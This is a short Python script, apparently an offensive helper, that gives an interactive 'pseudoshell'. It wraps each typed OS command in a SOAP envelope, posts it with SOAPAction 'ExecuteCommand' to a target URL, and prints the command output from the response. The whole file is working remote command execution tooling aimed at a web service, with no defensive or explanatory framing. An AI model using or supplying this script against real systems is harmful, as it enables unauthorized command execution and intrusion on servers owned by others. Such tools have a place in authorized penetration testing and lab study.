webservice-pseudoshell.py

import sys
import requests
import xml.etree.ElementTree as ET

def execute_command(url):
    while True:
        cmd = input("pseudoshell$ ")
        payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
        
        response = requests.post(url, data=payload, headers={"SOAPAction": '"ExecuteCommand"'})
        
        response_content = response.content.decode('utf-8')
        
        try:
            root = ET.fromstring(response_content)
            
            namespaces = {
                'soap': 'http://schemas.xmlsoap.org/soap/envelope/',
                'tns': 'http://tempuri.org/'
            }
            
            result_element = root.find('.//{http://tempuri.org/}result')
            
            if result_element is not None:
                result_text = result_element.text.strip()
                print(result_text)
            else:
                print("Please enter a valid OS command")
        except AttributeError:
            print("Please enter a valid OS command")
        except Exception as e:
            print("An error occurred:", e)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    execute_command(url)
